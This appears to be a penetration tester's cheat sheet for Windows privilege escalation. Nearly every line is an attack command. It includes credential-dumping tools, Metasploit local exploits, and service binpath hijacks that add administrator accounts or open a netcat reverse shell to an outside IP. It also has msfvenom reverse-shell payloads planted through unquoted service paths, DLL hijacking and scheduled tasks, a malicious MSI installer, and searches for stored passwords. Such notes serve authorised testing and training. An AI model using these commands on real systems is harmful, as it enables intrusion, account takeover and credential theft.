WINDOWS
● Basic System Information
○ systeminfo
○ whoami; echo %username; hostname
○ net user
○ net localgroup
○ net use
● Check User Folders
○ Dir C:\users\..
● Environment
○ Set
○ Remember you will have the permissions of the process you pwned! (i.e.,
browser privs for clientside so C:\Users\nina\AppData\Local\Temp\Low)

● Password hashes
○ wce -w; fgdump; mimikatz.exe
● Network
○ arp -a
○ ipconfig /all
○ netstat -ano
○ netstat -nr
○ route print
● Firewall
○ netsh firewall show state
○ netsh firewall show config

Exploits
wmic qfe get Caption,Description,HotFixID,InstalledOn
This will show us all the hotfixes which have been installed, we should be able to tell from this which
exploits will work and which wont (i.e., KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059
(KB982799), MS10-021 (KB979683), MS11-080 (KB2592799)
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_injection
use exploit/windows/local/ms10_015_kitrap0d
use exploit/windows/local/ms10_092_schelevator
use exploit/windows/local/ms11_080_afdjoinleaf
use exploit/windows/local/ms13_005_hwnd_broadcast
use exploit/windows/local/ms13_081_track_popup_menu

Services and Processes:
● tasklist /SVC
● net start
● sc query
● sc query state= all
● Get-WmiObject win32_service | select Name, DisplayName, State,
PathName | Out-File
● sc qc service.exe (for binpath)
● iacls.exe or cacls.exe (for permissions)
● dir /S *foo* (find)
● dir /Q (for ownership)
● schtasks /query /fo LIST /v
Service Prep
● sc qc upnphost
● sc config upnphost obj= ".\LocalSystem" password= ""
Binary Execution
● sc config upnphost binpath= “C:\evil.exe”
Netcat
● sc config upnphost binpath= “\“C:\nc.exe\” \”-nv 10.11.0.185
443 -e C:\windows\system32\cmd.exe\””
User Add
● sc config upnphost binpath= “net user lecon lecon /add”
● sc config upnphost binpath= “net localgroup Administrators lecon /add”
● sc config upnphost binpath= “net localgroup “/Remote Desktop Users/” lecon
/add”

Unquoted Service Paths
Any service path containing spaces and not quoted we can defeat by placing an executable
along the path before the service executable. e.g.,-
wmic service get name,displayname,pathname,startmode |findstr /i
"Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
C:\Program Files (x86)\Privacyware\Privatefirewall 7.0\pfsvc.exe
Now if we have the correct permissions we can create a file called ‘Privatefirewall.exe’ and drop
it into the ‘Privacyware’ folder.

icacls "C:\Program Files (x86)\Privacyware"
BUILTIN\Users:(OI)(CI)(M), lists the permissions for unprivileged users. The (M) stands for Modify,
which grants any unprivileged user, the ability to read, write and delete files and subfolders within this
folder
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai
LHOST=10.0.0.100 LPORT=443 -f exe -o Privatefirewall.exe
Metasploit Module: exploit/windows/local/trusted_service_path
A review of the source code reveals that the module uses some regular expression magic to
filter out any paths that are quoted or have no spaces in the path to create a list of vulnerable
services. The module then attempts to exploit the first vulnerable service on the list by dropping
a malicious executable into the affected folder.
Vulnerable Services
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
This command will attempt to determine which Services can be modified by any authenticated user
(regardless of privilege level).
RW PFNet
SERVICE_ALL_ACCESS
● sc qc PFNet
BINARY_PATH_NAME - ../system32/pfsvc.exe
We have two options here - put whatever file we want to run in that location and restart the service, or
take a more direct approach:-
● sc config PFNET binpath= "net user lecon pass /add"
● sc stop PFNET
● sc start PFNET
● sc config PFNET binpath= "net localgroup Administrators lecon /add"
● sc stop PFNET
● sc start PFNET
● Profit!
Metasploit Module: exploit/windows/local/service_permissions

Always Install Elevated
What we would like to do is create a service and push an executable into that service binary
path, however there is one registry entry we need on our side - “AlwaysInstallElevated”:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/adduser USER=lecon PASS=P@ssword01 -f msi -o rotten.msi
msiexec /quiet /qn /i C:\Users\Steve\Downloads\rotten.msi
/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation
Metasploit Module: exploit/windows/local/always_install_elevated
Unattended Installs

C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\
Note: In addition to Unattend.xml files, be on the lookout for sysprep.xml and sysprep.inf files on
the file system. These files can also contain credential information utilizing during deployment
of the operating system, allowing us to escalate privileges.
Once you’ve located an Unattend file, open it up and search for the <UserAccounts> tag.
Metasploit Module: post/windows/gather/enum_unattend
DLL Hijacking
Determine a DLL that a service or other application is attempting to load, the order is below:

1 - The directory from which the application loaded
2 - 32-bit System directory (C:\Windows\System32)
3 - 16-bit System directory (C:\Windows\System)
4 - Windows directory (C:\Windows)
5 - The current working directory (CWD)
6 - Directories in the PATH environment variable (system then user)
E.g., Since the DLL in question does not exist we will end up traversing all the search
paths. As a low privilege user we have little hope of putting a malicious DLL in 1-4, 5 is
not a possibility in this case because we are talking about a Windows service but if we
have write access to any of the directories in the Windows PATH we win:

echo %path%
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\Wind
owsPowerShell\v1.0\;C:\Program Files\OpenVPN\bin;C:\Python27
We can see here an opportunity to insert a malicious executable as the reliant DLL in the
C:\python27 path.
Check the vulnerable service to see if we can restart
accesschk.exe -dqv "C:\Python27"
cacls "C:\Python27"
sc qc IKEEXT
Create simple malicious DLL and copy it to target system in vuln $PATH
msfvenom -p windows/shell_reverse_tcp lhost='127.0.0.1' lport='4444'
-f dll > evil.dll
copy evil.dll C:\Python27\wlbsctrl.dll
Restart service, profit.
net start IKEEXT
Scheduled Tasks
Determine a scheduled task that runs as SYSTEM, we can then simply drop in a msfvenom
executable into the path if we have appropriate permissions:
schtasks /query /fo LIST /v
Task To Run: E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out E:\GrabLogs\Logs\log.txt
...
Run As User: SYSTEM
accesschk.exe -dqv "E:\GrabLogs"
icacls "E:\GrabLogs"
msfvenom -p windows/reverse_shell_tcp lhost=10.11.1.1 lport=4444 -f
exe > mal.exe
copy mal.exe E:\GrabLogs\tftp.exe

Scripts:
Windows Exploit Suggester
python windows-exploit-suggester.py -i sysinfo.txt -d
2017-08-21-mssb.xls

PowerShell Empire - PowerUP
Download PowerUp.ps1 script, and amend to the bottom of the script:
Invoke-AllChecks | out-file “PowerUP.txt”
Powershell.exe -ExecutionPolicy Bypass -File PowerUp.ps1
Searching for useful information:
# The command below will search the file system for file names containing certain keywords.
You can
specify as many keywords as you wish.
C:\Windows\system32> dir /s *pass* == *cred* == *vnc* == *.config*
# Search certain file types for a keyword, this can generate a lot of output.
C:\Windows\system32> findstr /si password *.xml *.ini *.txt
# Similarly the two commands below can be used to grep the registry for keywords, in this case
"password".
C:\Windows\system32> reg query HKLM /f password /t REG_SZ /s
C:\Windows\system32> reg query HKCU /f password /t REG_SZ /s
Putty clear text proxy credentials:
reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"

Search the registry - copy (pipe) to the clipboard (optional)
reg query HKLM /f password /t REG_SZ /s [ |clip]
reg query HKCU /f password /t REG_SZ /s [ |clip]

Resources:

http://www.fuzzysecurity.com/tutorials/16.html

https://www.toshellandback.com/2015/11/24/ms-priv-esc/

https://attack.mitre.org/wiki/Privilege_Escalation
